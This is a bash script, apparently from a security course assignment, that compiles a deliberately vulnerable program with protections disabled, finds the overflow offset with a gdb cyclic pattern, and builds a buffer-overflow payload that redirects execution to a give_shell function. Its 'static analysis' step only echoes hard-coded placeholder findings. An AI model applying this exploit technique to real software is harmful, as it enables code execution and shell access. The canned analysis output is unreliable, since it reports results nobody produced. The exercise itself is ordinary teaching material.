#!/bin/bash

# Step 1: Compile
echo "Compiling StackOverflowHW.cpp into x86 binary, disabling countermeasures..."
make clean
make StackOverflowHW

# Step 2: Manual Static Analysis
echo -e "\nPerforming manual static analysis..."
# Insert manual analysis comments
echo "Found vulnerable system call in function XYZ."
echo "No boundary check in mgets() function."

# Step 3: Dynamic Analysis using Valgrind
echo -e "\nPerforming dynamic analysis using Valgrind..."
valgrind --tool=memcheck --leak-check=full ./StackOverflowHW

# Step 4: Exploit the Program
echo -e "\nExploiting the program..."
# Finding offset using gdb-peda
gdb -q StackOverflowHW <<EOF
run
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%y
patts
q
EOF

# Get the address of the function
function_address=$(nm StackOverflowHW | grep give_shell | cut -d ' ' -f 1)
little_endian_address=$(printf '\\x%s\\x%s\\x%s\\x%s' ${function_address:6:2} ${function_address:4:2} ${function_address:2:2} ${function_address:0:2})

# Create payload and run the program
echo -e "Creating payload..."
python -c "import sys; sys.stdout.buffer.write(b'A'*312 + b'$little_endian_address')" > payload.bin
cat payload.bin - | ./StackOverflowHW

echo "Script execution completed."
